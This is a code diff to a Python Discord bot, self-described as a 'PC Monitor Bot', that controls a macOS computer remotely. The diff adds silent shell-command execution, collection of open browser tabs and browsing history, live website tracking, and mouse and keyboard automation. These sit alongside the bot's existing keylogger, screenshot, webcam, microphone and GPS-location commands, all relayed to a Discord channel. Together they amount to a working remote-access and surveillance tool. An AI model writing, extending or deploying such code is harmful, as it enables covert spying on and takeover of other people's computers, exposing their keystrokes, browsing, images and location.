+        'processes': 'ps aux | grep -v grep | head -20',
+        'diskspace': 'df -h',
+        'memory': 'vm_stat',
+        'network': 'netstat -rn',
+        'listening': 'lsof -i -P | grep LISTEN',
+        'ports': 'netstat -an | grep LISTEN',
+        'uptime': 'uptime',
+        'users': 'who',
+        'env': 'env | sort',
+        'path': 'echo $PATH | tr ":" "\\n"',
+        'cpu': 'top -l 1 -n 0 | grep "CPU usage"',
+        'load': 'uptime | awk \'{print $10 $11 $12}\'',
+        'kernel': 'uname -a',
+        'osversion': 'sw_vers',
+        'architecture': 'uname -m',
+        'hostname': 'hostname',
+        'date': 'date',
+        'timezone': 'date +%Z',
+        'shell': 'echo $SHELL'
+    }
+    return aliases.get(command, command)
+
+def resolve_working_directory(cwd_input):
+    """Resolve working directory input to actual path."""
+    if not cwd_input:
+        return os.getcwd()
+    
+    # Handle special shortcuts
+    shortcuts = {
+        'home': os.path.expanduser('~'),
+        'desktop': os.path.expanduser('~/Desktop'),
+        'documents': os.path.expanduser('~/Documents'),
+        'downloads': os.path.expanduser('~/Downloads'),
+        'applications': '/Applications',
+        'tmp': '/tmp',
+        'var': '/var'
+    }
+    
+    if cwd_input.lower() in shortcuts:
+        return shortcuts[cwd_input.lower()]
+    
+    # Expand user path
+    expanded = os.path.expanduser(cwd_input)
+    
+    # Validate path exists and is directory
+    if os.path.exists(expanded) and os.path.isdir(expanded):
+        return expanded
+    else:
+        return None
+
+def execute_command_silent(command, timeout=30, cwd=None):
+    """Execute shell command silently in background."""
+    import time
+    start_time = time.time()
+    
+    try:
+        # Resolve working directory
+        if cwd:
+            resolved_cwd = resolve_working_directory(cwd)
+            if resolved_cwd is None:
+                return {
+                    'success': False,
+                    'stdout': '',
+                    'stderr': f'Working directory does not exist: {cwd}',
+                    'returncode': 1,
+                    'duration': 0
+                }
+        else:
+            resolved_cwd = None
+        
+        # Execute command
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            cwd=resolved_cwd,
+            env=os.environ.copy()
+        )
+        
+        duration = time.time() - start_time
+        
+        return {
+            'success': True,
+            'stdout': result.stdout,
+            'stderr': result.stderr,
+            'returncode': result.returncode,
+            'duration': duration,
+            'command': command,
+            'cwd': resolved_cwd or os.getcwd()
+        }
+        
+    except subprocess.TimeoutExpired:
+        duration = time.time() - start_time
+        return {
+            'success': False,
+            'stdout': '',
+            'stderr': f'Command timed out after {timeout} seconds',
+            'returncode': 124,
+            'duration': duration,
+            'command': command,
+            'cwd': resolved_cwd or os.getcwd()
+        }
+    except Exception as e:
+        duration = time.time() - start_time
+        return {
+            'success': False,
+            'stdout': '',
+            'stderr': f'Execution error: {str(e)}',
+            'returncode': 1,
+            'duration': duration,
+            'command': command,
+            'cwd': resolved_cwd or os.getcwd()
+        }
+
+def format_command_output(result):
+    """Format command execution result for Discord output."""
+    command = result.get('command', 'Unknown')
+    cwd = result.get('cwd', 'Unknown')
+    duration = result.get('duration', 0)
+    returncode = result.get('returncode', 0)
+    stdout = result.get('stdout', '').strip()
+    stderr = result.get('stderr', '').strip()
+    success = result.get('success', False)
+    
+    # Status emoji
+    status_emoji = "✅" if success and returncode == 0 else "❌"
+    
+    # Build response
+    response = f"{status_emoji} **Command {'executed successfully' if success and returncode == 0 else 'execution failed'}**\n\n"
+    response += f"📝 **Command**: `{command}`\n"
+    response += f"📁 **Directory**: `{cwd}`\n"
+    response += f"⏱️ **Duration**: {duration:.2f}s\n"
+    response += f"📤 **Exit Code**: {returncode}\n\n"
+    
+    # Add output sections
+    if stdout:
+        # Truncate if too long
+        if len(stdout) > 1500:
+            truncated_stdout = stdout[:1500] + "\n... (output truncated)"
+        else:
+            truncated_stdout = stdout
+        response += f"📋 **Output**:\n```\n{truncated_stdout}\n```\n\n"
+    
+    if stderr:
+        # Truncate if too long
+        if len(stderr) > 800:
+            truncated_stderr = stderr[:800] + "\n... (error output truncated)"
+        else:
+            truncated_stderr = stderr
+        response += f"💡 **Stderr**:\n```\n{truncated_stderr}\n```\n\n"
+    
+    # Add suggestions for common issues
+    if not success or returncode != 0:
+        response += "🛠️ **Suggestions**:\n"
+        if "command not found" in stderr.lower():
+            response += "• Check if the command is installed and in PATH\n"
+            response += "• Try using the full path to the command\n"
+        elif "permission denied" in stderr.lower():
+            response += "• Check file/directory permissions\n"
+            response += "• Ensure you have access to the target location\n"
+        elif "timeout" in stderr.lower():
+            response += "• Try increasing the timeout value\n"
+            response += "• Check if the command requires user input\n"
+        elif returncode == 124:
+            response += "• Command timed out - try increasing timeout\n"
+            response += "• Check if command is hanging or waiting for input\n"
+        else:
+            response += "• Check command syntax and arguments\n"
+            response += "• Verify all file paths exist\n"
+    
+    return response
+
+def track_command_history(command, success, duration, returncode):
+    """Track command execution in history."""
+    global command_history
+    
+    history_entry = {
+        'command': command,
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'success': success,
+        'duration': duration,
+        'returncode': returncode
+    }
+    
+    command_history.append(history_entry)
+    
+    # Keep only last 20 commands
+    if len(command_history) > 20:
+        command_history = command_history[-20:]
+
 def on_key_press(key):
     global last_send_time
     if keylogger_active:
@@ -1444,27 +2688,99 @@ async def help_command(interaction: discord.Interaction):
     if not is_pc_monitor_channel(interaction):
         await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
         return
-    help_text = """
-**PC Monitor Bot Commands**
-/ss - Take a screenshot
-/mic - Record audio from the microphone
-/media - Control media playback (play/pause/next/prev)
-/volume - Set system volume (0-100%)
-/power - Control system power (sleep/restart/shutdown)
-/keylogger - Start or stop the keylogger
-/sysinfo - Show comprehensive system information (location, battery, CPU, RAM, etc.)
-/ip - Show IP address
-/locate - Get precise location with GPS coordinates and timestamp
-/uptime - Show system uptime
-/processes - Show top 15 processes by CPU or RAM usage
-/camera - Take a webcam photo
-/find - Search files by name/regex, optional content filter
-/find-process - Find processes by name/PID; use before /kill. Alias: /find-proccess
-/kill - Terminate a process by PID (recommended) or name, with safety checks
-/all - Run all monitoring commands
-/debug - Check the status of screenshot, audio recording, camera, and key system functions
+    
+    try:
+        help_text = """
+# 🖥️ PC Monitor Bot - Complete Command Guide
+
+## 📊 System Monitoring
+• **/sysinfo** - Complete system info (CPU, RAM, battery, network, location)
+• **/ip** - Show local and public IP addresses
+• **/uptime** - System uptime and boot time
+• **/processes** `cpu|ram` - Top 15 processes by CPU or RAM usage
+• **/locate** - GPS location with coordinates and timestamp
+
+## 📸 Surveillance & Media Capture  
+• **/ss** - Take full screen screenshot
+• **/camera** - Capture webcam photo
+• **/mic** `[duration]` - Record audio (default 10 seconds)
+• **/keylogger** `start|stop` - Real-time keystroke monitoring
+
+## 🎛️ System Control
+• **/power** `sleep|restart|shutdown` - System power management
+• **/volume** `0-100` - Set system volume percentage
+• **/media** `play|next|prev` - Control media playback (Spotify, YouTube, etc.)
+
+## 🔍 File & Process Management
+• **/find** `filename` - Search files with partial name matching (includes hidden)
+• **/find-process** `name|pid` - Find running processes
+• **/kill** `pid|name` - Terminate processes (PID recommended for safety)
+
+## 🌐 Browser Monitoring
+• **/active-tabs** - Show open browser tabs across all browsers
+• **/browser-history** `[browser] [hours] [limit]` - Recent browsing history
+• **/website-monitor** `start|stop` - Real-time website change monitoring
+
+## 🚀 Remote Control & Automation
+• **/open** `app|website|file` - Quick launch with predefined choices
+• **/open-custom** `target` - Open anything (apps, URLs, files, searches)
+• **/cmd** `command` - Execute shell commands silently
+• **/cmd-history** `[limit]` - Show recent command history
+• **/cmd-help** - Safe command usage examples
+
+## 🖱️ GUI Automation
+• **/click** `x y [button] [clicks] [hold_duration]`
+  - Normal: `/click 500 300`
+  - Right click: `/click 100 200 right`
+  - Double click: `/click 300 400 left 2`
+  - Long click: `/click 500 300 left 1 2.5` (hold 2.5s)
+
+• **/type** `text` - Type with special keys
+  - Basic: `/type Hello World!`
+  - With Enter: `/type Username\\nPassword\\n`
+  - With Tab: `/type Field1\\tField2`
+
+• **/scroll** `clicks direction [x] [y]`
+  - Current position: `/scroll 5 up`
+  - Specific location: `/scroll 500 300 10 down`
+
+• **/shortcut** `keys` - Keyboard shortcuts (separate with +)
+  - Copy: `/shortcut command+c` (Mac) or `/shortcut ctrl+c` (Win/Linux)
+  - Mission Control: `/shortcut fn+f3`
+  - Task Manager: `/shortcut ctrl+shift+esc`
+  - Close window: `/shortcut alt+f4`
+  
+  **Supported keys:** command, ctrl, alt, shift, fn, f1-f12, a-z, 0-9,
+  tab, enter, space, up, down, left, right, delete, backspace
+  **Format:** Use + to separate (max 5 keys)
+
+## 🛠️ Utilities
+• **/all** - Run comprehensive system monitoring suite
+• **/debug** - Test all functions and check permissions
+• **/help** - Show this complete command reference
+
+## 🔒 Security Notes
+⚠️ All commands restricted to #pc-monitor channel only
+⚠️ Requires various macOS permissions (Accessibility, Screen Recording, etc.)
+⚠️ Use responsibly - provides full remote computer access
+
+## 💡 Quick Tips
+- Use `/debug` first to check permissions and functionality
+- Commands with choices show auto-completion options
+- All media files auto-delete after transmission
+- Long operations show progress with deferred responses
 """
-    await interaction.response.send_message(help_text)
+        await interaction.response.send_message(help_text)
+        
+    except Exception as e:
+        logger.error(f"Error in help command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error displaying help: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error displaying help: {str(e)}")
+        except Exception:
+            pass
 
 @bot.tree.command(name='ss', description='Take a screenshot of the current screen')
 async def screenshot(interaction: discord.Interaction):
@@ -1536,11 +2852,23 @@ async def volume(interaction: discord.Interaction, level: int):
     if not is_pc_monitor_channel(interaction):
         await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
         return
-    success, result = set_volume(level)
-    if success:
-        await interaction.response.send_message(f"🔊 Volume set to {result}%")
-    else:
-        await interaction.response.send_message(f"Error setting volume: {result}")
+    
+    try:
+        success, result = set_volume(level)
+        if success:
+            await interaction.response.send_message(f"🔊 Volume set to {result}%")
+        else:
+            await interaction.response.send_message(f"❌ Error setting volume: {result}")
+            
+    except Exception as e:
+        logger.error(f"Error in volume command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error setting volume: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error setting volume: {str(e)}")
+        except Exception:
+            pass
 
 @bot.tree.command(name='power', description='Control system power state (shutdown, restart, sleep)')
 @discord.app_commands.describe(action='Power action to perform')
@@ -1675,7 +3003,13 @@ async def ip_address(interaction: discord.Interaction):
         await interaction.response.send_message(f"🌐 IP Address: {ip}")
     except Exception as e:
         logger.error(f"Error getting IP address: {str(e)}")
-        await interaction.response.send_message(f"Error getting IP address: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error getting IP address: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error getting IP address: {str(e)}")
+        except Exception:
+            pass
 
 @bot.tree.command(name='locate', description='Get precise location with GPS coordinates and timestamp')
 async def locate(interaction: discord.Interaction):
@@ -1770,7 +3104,13 @@ async def uptime(interaction: discord.Interaction):
         await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
     except Exception as e:
         logger.error(f"Error getting uptime: {str(e)}")
-        await interaction.response.send_message(f"Error getting uptime: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error getting uptime: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error getting uptime: {str(e)}")
+        except Exception:
+            pass
 
 @bot.tree.command(name='processes', description='Show top 15 processes by CPU or RAM usage')
 @discord.app_commands.describe(sort_by='Sort processes by CPU or RAM usage')
@@ -2152,6 +3492,650 @@ async def kill_process(interaction: discord.Interaction, pid: int = None, name: 
         except Exception:
             pass
 
+@bot.tree.command(name='active-tabs', description='Show currently open browser tabs')
+@discord.app_commands.describe(
+    browser='Browser to check (Chrome, Safari, Firefox, etc.) or "all" for all browsers',
+    limit='Maximum number of tabs to display'
+)
+@discord.app_commands.choices(browser=[
+    discord.app_commands.Choice(name='All Browsers', value='all'),
+    discord.app_commands.Choice(name='Google Chrome', value='Google Chrome'),
+    discord.app_commands.Choice(name='Safari', value='Safari'),
+    discord.app_commands.Choice(name='Firefox', value='Firefox'),
+    discord.app_commands.Choice(name='Brave Browser', value='Brave Browser'),
+    discord.app_commands.Choice(name='Microsoft Edge', value='Microsoft Edge')
+])
+async def active_tabs(interaction: discord.Interaction, browser: discord.app_commands.Choice[str] = None, limit: int = 20):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        browser_name = browser.value if browser else "all"
+        
+        # Get running browsers first
+        running_browsers = get_running_browsers()
+        if not running_browsers:
+            await interaction.followup.send("🔍 No supported browsers are currently running.")
+            return
+        
+        # Get tabs
+        tabs = get_browser_tabs(browser_name)
+        
+        if not tabs:
+            if browser_name == "all":
+                await interaction.followup.send(f"🔍 No tabs found in running browsers: {', '.join(running_browsers)}")
+            else:
+                await interaction.followup.send(f"🔍 No tabs found in {browser_name} or browser is not running.")
+            return
+        
+        # Limit results
+        if limit and len(tabs) > limit:
+            tabs = tabs[:limit]
+            limited_msg = f" (showing first {limit})"
+        else:
+            limited_msg = ""
+        
+        # Format response
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        # Create preview message
+        preview_text = f"🌐 **Found {len(tabs)} open tab{'s' if len(tabs) != 1 else ''}**{limited_msg}\n"
+        preview_text += f"**Running browsers**: {', '.join(running_browsers)}\n\n"
+        
+        # Show first 5 tabs in preview
+        for i, tab in enumerate(tabs[:5]):
+            title = tab['title'][:60] + "..." if len(tab['title']) > 60 else tab['title']
+            url = tab['url'][:80] + "..." if len(tab['url']) > 80 else tab['url']
+            preview_text += f"**{tab['browser']}** - {title}\n`{url}`\n\n"
+        
+        if len(tabs) > 5:
+            preview_text += f"... and {len(tabs) - 5} more tabs (see attachment)\n"
+        
+        # Create detailed file
+        detailed_content = f"Active Browser Tabs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        detailed_content += "=" * 60 + "\n\n"
+        
+        current_browser = None
+        for tab in tabs:
+            if current_browser != tab['browser']:
+                current_browser = tab['browser']
+                detailed_content += f"\n--- {current_browser} ---\n"
+            
+            detailed_content += f"Title: {tab['title']}\n"
+            detailed_content += f"URL: {tab['url']}\n"
+            detailed_content += f"Window: {tab.get('window', 'Unknown')}\n"
+            detailed_content += "-" * 40 + "\n"
+        
+        # Save to file
+        filename = f"active_tabs_{timestamp}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(detailed_content)
+        
+        # Send response
+        await interaction.followup.send(
+            preview_text,
+            file=discord.File(filename)
+        )
+        
+        # Cleanup
+        os.remove(filename)
+        
+    except Exception as e:
+        logger.error(f"Error in active-tabs command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error getting browser tabs: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error getting browser tabs: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='browser-history', description='Show recent browser history from databases')
+@discord.app_commands.describe(
+    browser='Browser to check (Chrome, Safari, Firefox) or "all" for all browsers',
+    hours='Time range in hours (default: 24, max: 168)',
+    limit='Maximum number of entries to display (default: 50, max: 200)'
+)
+@discord.app_commands.choices(browser=[
+    discord.app_commands.Choice(name='All Browsers', value='all'),
+    discord.app_commands.Choice(name='Google Chrome', value='Google Chrome'),
+    discord.app_commands.Choice(name='Safari', value='Safari'),
+    discord.app_commands.Choice(name='Firefox', value='Firefox')
+])
+async def browser_history(interaction: discord.Interaction, browser: discord.app_commands.Choice[str] = None, hours: int = 24, limit: int = 50):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Validate parameters
+        if hours > 168:  # Max 1 week
+            hours = 168
+        if limit > 200:  # Max 200 entries
+            limit = 200
+        
+        browser_name = browser.value if browser else "all"
+        
+        # Get browser history
+        history = get_browser_history(browser_name, hours, limit)
+        
+        if not history:
+            await interaction.followup.send(f"🔍 No browser history found for the last {hours} hours in {browser_name}.\n\n**Note**: This requires **Full Disk Access** permission for your terminal app in System Settings > Privacy & Security.")
+            return
+        
+        # Format response
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        # Create preview message  
+        preview_text = f"📚 **Found {len(history)} history entries**\n"
+        preview_text += f"**Time range**: Last {hours} hours\n"
+        preview_text += f"**Browser**: {browser_name}\n\n"
+        
+        # Show first 5 entries in preview
+        for i, entry in enumerate(history[:5]):
+            title = entry['title'][:50] + "..." if len(entry['title']) > 50 else entry['title']
+            url = entry['url'][:70] + "..." if len(entry['url']) > 70 else entry['url']
+            preview_text += f"**{entry['browser']}** - {entry['last_visit']}\n"
+            preview_text += f"📄 {title}\n"
+            preview_text += f"🔗 `{url}`\n"
+            preview_text += f"👁️ Visits: {entry['visit_count']}\n\n"
+        
+        if len(history) > 5:
+            preview_text += f"... and {len(history) - 5} more entries (see attachment)\n"
+        
+        # Add privacy warning
+        preview_text += "\n⚠️ **Privacy Note**: Browser history may contain sensitive personal information."
+        
+        # Create detailed file
+        detailed_content = f"Browser History - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        detailed_content += f"Time Range: Last {hours} hours\n"
+        detailed_content += f"Browser: {browser_name}\n"
+        detailed_content += "=" * 80 + "\n\n"
+        
+        current_browser = None
+        for entry in history:
+            if current_browser != entry['browser']:
+                current_browser = entry['browser']
+                detailed_content += f"\n--- {current_browser} ---\n"
+            
+            detailed_content += f"Time: {entry['last_visit']}\n"
+            detailed_content += f"Title: {entry['title']}\n"
+            detailed_content += f"URL: {entry['url']}\n"
+            detailed_content += f"Visit Count: {entry['visit_count']}\n"
+            detailed_content += "-" * 60 + "\n"
+        
+        # Save to file
+        filename = f"browser_history_{timestamp}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(detailed_content)
+        
+        # Send response
+        await interaction.followup.send(
+            preview_text,
+            file=discord.File(filename)
+        )
+        
+        # Cleanup
+        os.remove(filename)
+        
+    except Exception as e:
+        logger.error(f"Error in browser-history command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error getting browser history: {str(e)}\n\n**Note**: This requires **Full Disk Access** permission for your terminal app.")
+            else:
+                await interaction.followup.send(f"❌ Error getting browser history: {str(e)}\n\n**Note**: This requires **Full Disk Access** permission for your terminal app.")
+        except Exception:
+            pass
+
+@bot.tree.command(name='website-monitor', description='Monitor active website changes in real-time')
+@discord.app_commands.describe(
+    action='Action to perform: start monitoring, stop monitoring, or check status',
+    interval='Check interval in seconds (default: 30, min: 10, max: 300)'
+)
+@discord.app_commands.choices(action=[
+    discord.app_commands.Choice(name='Start Monitoring', value='start'),
+    discord.app_commands.Choice(name='Stop Monitoring', value='stop'),
+    discord.app_commands.Choice(name='Check Status', value='status')
+])
+async def website_monitor(interaction: discord.Interaction, action: discord.app_commands.Choice[str], interval: int = 30):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        action_value = action.value
+        
+        if action_value == 'start':
+            # Validate interval
+            if interval < 10:
+                interval = 10
+            elif interval > 300:
+                interval = 300
+            
+            success, message = start_website_monitor(interaction.channel, interval)
+            
+            if success:
+                current_info = get_active_website_info()
+                response = f"✅ {message}\n\n"
+                
+                if current_info:
+                    title = current_info['title'][:80] + "..." if len(current_info['title']) > 80 else current_info['title']
+                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
+                    response += f"**Currently Active:**\n"
+                    response += f"**Browser**: {current_info['browser']}\n"
+                    response += f"**Title**: {title}\n"
+                    response += f"**URL**: `{url}`"
+                else:
+                    response += "No active browser tabs detected."
+                
+                response += f"\n\n📡 Bot will notify you when the active website changes every {interval} seconds."
+                response += "\n⚠️ **Privacy Note**: This will monitor all active browser tabs and URLs."
+                
+                await interaction.response.send_message(response)
+            else:
+                await interaction.response.send_message(f"❌ {message}")
+        
+        elif action_value == 'stop':
+            success, message = stop_website_monitor()
+            
+            if success:
+                await interaction.response.send_message(f"✅ {message}")
+            else:
+                await interaction.response.send_message(f"❌ {message}")
+        
+        elif action_value == 'status':
+            global website_monitor_active
+            
+            if website_monitor_active:
+                current_info = get_active_website_info()
+                status_msg = "🟢 **Website Monitor Active**\n\n"
+                
+                if current_info:
+                    title = current_info['title'][:80] + "..." if len(current_info['title']) > 80 else current_info['title']
+                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
+                    status_msg += f"**Currently Active:**\n"
+                    status_msg += f"**Browser**: {current_info['browser']}\n"
+                    status_msg += f"**Title**: {title}\n"
+                    status_msg += f"**URL**: `{url}`\n\n"
+                else:
+                    status_msg += "No active browser tabs detected.\n\n"
+                
+                running_browsers = get_running_browsers()
+                if running_browsers:
+                    status_msg += f"**Running Browsers**: {', '.join(running_browsers)}"
+                else:
+                    status_msg += "**Running Browsers**: None detected"
+                
+                await interaction.response.send_message(status_msg)
+            else:
+                await interaction.response.send_message("🔴 **Website Monitor Inactive**\n\nUse `/website-monitor start` to begin monitoring.")
+        
+    except Exception as e:
+        logger.error(f"Error in website-monitor command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error with website monitor: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error with website monitor: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='open', description='Open applications, websites, files, or system utilities')
+@discord.app_commands.describe(
+    target='What to open (app name, URL, file path, or use quick options)',
+    args='Optional arguments to pass to the application'
+)
+@discord.app_commands.choices(target=[
+    discord.app_commands.Choice(name='🌐 Custom URL/Website', value='url'),
+    discord.app_commands.Choice(name='📱 Safari Browser', value='Safari'),
+    discord.app_commands.Choice(name='🌍 Google Chrome', value='Google Chrome'),
+    discord.app_commands.Choice(name='🔥 Firefox', value='Firefox'),
+    discord.app_commands.Choice(name='🎵 Spotify', value='Spotify'),
+    discord.app_commands.Choice(name='💬 Discord', value='Discord'),
+    discord.app_commands.Choice(name='💻 Visual Studio Code', value='Visual Studio Code'),
+    discord.app_commands.Choice(name='🧮 Calculator', value='Calculator'),
+    discord.app_commands.Choice(name='📝 Notes', value='Notes'),
+    discord.app_commands.Choice(name='⚙️ System Preferences', value='System Preferences'),
+    discord.app_commands.Choice(name='🖥️ Activity Monitor', value='Activity Monitor'),
+    discord.app_commands.Choice(name='💻 Terminal', value='Terminal'),
+    discord.app_commands.Choice(name='📁 Finder', value='Finder'),
+    discord.app_commands.Choice(name='📥 Downloads Folder', value='downloads'),
+    discord.app_commands.Choice(name='📄 Documents Folder', value='documents'),
+    discord.app_commands.Choice(name='🖥️ Desktop Folder', value='desktop'),
+    discord.app_commands.Choice(name='📱 Applications Folder', value='applications')
+])
+async def open_command(interaction: discord.Interaction, target: discord.app_commands.Choice[str] = None, args: str = None):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Handle choice-based input vs free text
+        if target:
+            target_value = target.value
+            if target_value == 'url':
+                # Ask user to provide URL in follow-up
+                await interaction.followup.send("🌐 Please specify the URL you want to open. Example: `/open https://github.com` or `/open youtube.com`")
+                return
+        else:
+            # No target provided
+            await interaction.followup.send("❌ Please specify what you want to open.\n\n**Examples:**\n• `/open Safari`\n• `/open https://github.com`\n• `/open ~/Documents`\n• `/open search: python tutorials`\n• `/open pref: network`")
+            return
+        
+        # Execute the open command
+        success, message = open_target(target_value, args)
+        
+        if success:
+            response = f"✅ {message}"
+            
+            # Add helpful info based on what was opened
+            if is_url(target_value):
+                response += f"\n🌐 Opened in default browser"
+            elif target_value.lower() in ['downloads', 'documents', 'desktop', 'applications', 'home']:
+                response += f"\n📁 Opened in Finder"
+            elif target_value.lower().startswith(('pref:', 'preference:', 'setting:')):
+                response += f"\n⚙️ System Preferences launched"
+            else:
+                response += f"\n📱 Application launched"
+            
+            await interaction.followup.send(response)
+        else:
+            error_response = f"❌ {message}"
+            
+            # Add helpful suggestions based on error type
+            if "not found" in message.lower() or "not installed" in message.lower():
+                error_response += f"\n\n💡 **Suggestions:**\n• Check if the application is installed\n• Try using the full application name\n• Use `/open applications` to browse installed apps"
+            elif "does not exist" in message.lower():
+                error_response += f"\n\n💡 **Suggestions:**\n• Check the file path spelling\n• Use `~/` for home directory\n• Try `/open documents` for common folders"
+            
+            await interaction.followup.send(error_response)
+        
+    except Exception as e:
+        logger.error(f"Error in open command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error opening target: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error opening target: {str(e)}")
+        except Exception:
+            pass
+
+# Add a separate command for free text input
+@bot.tree.command(name='open-custom', description='Open anything by typing the target freely (apps, URLs, files, etc.)')
+@discord.app_commands.describe(
+    target='What to open (app name, URL, file path, search query, etc.)',
+    args='Optional arguments to pass to the application'
+)
+async def open_custom_command(interaction: discord.Interaction, target: str, args: str = None):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Execute the open command
+        success, message = open_target(target, args)
+        
+        if success:
+            response = f"✅ {message}"
+            
+            # Add type detection info
+            if is_url(target):
+                response += f"\n🌐 **Type**: Website/URL"
+            elif target.startswith(('/', '~')):
+                response += f"\n📁 **Type**: File/Folder"
+            elif target.lower().startswith(('pref:', 'preference:', 'setting:')):
+                response += f"\n⚙️ **Type**: System Preference"
+            elif target.lower().startswith('search:'):
+                response += f"\n🔍 **Type**: Google Search"
+            else:
+                response += f"\n📱 **Type**: Application"
+            
+            await interaction.followup.send(response)
+        else:
+            error_response = f"❌ {message}"
+            
+            # Add helpful examples
+            error_response += f"\n\n💡 **Examples:**\n"
+            error_response += f"• `spotify` - Open Spotify\n"
+            error_response += f"• `github.com` - Open GitHub\n"
+            error_response += f"• `~/Downloads` - Open Downloads folder\n"
+            error_response += f"• `search: how to code` - Google search\n"
+            error_response += f"• `pref: network` - Network settings"
+            
+            await interaction.followup.send(error_response)
+        
+    except Exception as e:
+        logger.error(f"Error in open-custom command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error opening target: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error opening target: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='cmd', description='Execute shell commands silently in background')
+@discord.app_commands.describe(
+    command='Shell command to execute (or use aliases like "sysinfo", "processes")',
+    timeout='Timeout in seconds (default: 30, max: 300)',
+    working_directory='Directory to run command in (use shortcuts: home, desktop, documents, downloads)'
+)
+async def cmd_command(interaction: discord.Interaction, command: str, timeout: int = 30, working_directory: str = None):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Validate timeout
+        if timeout > 300:
+            timeout = 300
+        elif timeout < 1:
+            timeout = 1
+        
+        # Resolve command aliases
+        resolved_command = resolve_command_alias(command)
+        
+        # Validate command safety
+        is_safe, safety_message = validate_command_safety(resolved_command)
+        if not is_safe:
+            await interaction.followup.send(f"🚫 **Command Blocked**\n\n{safety_message}\n\n💡 **Safe alternatives:**\n• Use built-in commands like `/sysinfo`, `/processes`\n• Avoid system modification commands\n• Check `/cmd-help` for safe command examples")
+            return
+        
+        # Execute command
+        result = execute_command_silent(resolved_command, timeout, working_directory)
+        
+        # Track in history
+        track_command_history(
+            resolved_command, 
+            result['success'] and result['returncode'] == 0,
+            result['duration'],
+            result['returncode']
+        )
+        
+        # Format and send response
+        formatted_output = format_command_output(result)
+        
+        # Check if response is too long for Discord
+        if len(formatted_output) > 1900:
+            # Create file for large output
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"cmd_output_{timestamp}.txt"
+            
+            file_content = f"Command: {result['command']}\n"
+            file_content += f"Directory: {result['cwd']}\n"
+            file_content += f"Duration: {result['duration']:.2f}s\n"
+            file_content += f"Exit Code: {result['returncode']}\n"
+            file_content += "=" * 50 + "\n\n"
+            
+            if result['stdout']:
+                file_content += "STDOUT:\n" + "=" * 20 + "\n"
+                file_content += result['stdout'] + "\n\n"
+            
+            if result['stderr']:
+                file_content += "STDERR:\n" + "=" * 20 + "\n"
+                file_content += result['stderr'] + "\n"
+            
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(file_content)
+            
+            # Send summary with file
+            summary = f"{'✅' if result['success'] and result['returncode'] == 0 else '❌'} **Command {'executed successfully' if result['success'] and result['returncode'] == 0 else 'execution failed'}**\n\n"
+            summary += f"📝 **Command**: `{result['command']}`\n"
+            summary += f"📁 **Directory**: `{result['cwd']}`\n"
+            summary += f"⏱️ **Duration**: {result['duration']:.2f}s\n"
+            summary += f"📤 **Exit Code**: {result['returncode']}\n\n"
+            summary += "📎 **Full output attached** (too large for Discord message)"
+            
+            await interaction.followup.send(summary, file=discord.File(filename))
+            os.remove(filename)
+        else:
+            await interaction.followup.send(formatted_output)
+        
